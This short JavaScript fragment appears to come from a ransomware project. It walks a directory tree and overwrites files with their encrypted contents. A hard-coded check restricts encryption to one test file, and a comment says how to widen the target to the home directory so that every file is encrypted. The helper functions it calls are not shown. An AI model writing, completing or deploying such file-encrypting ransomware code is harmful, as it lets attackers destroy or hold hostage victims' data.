;(async () => {
    // Change ../ to homedir to loop through all the changes
    for await (const f of getFiles('../')) {
        // this is just a check so that I only encrypt one file.
        if(f === '/Users/username/Documents/Projects/ransomware/test/test.txt') {
            const data = fs.readFileSync(f, 'utf8')
            fs.writeFileSync(f, encrypt(data))
        }
    }
  })()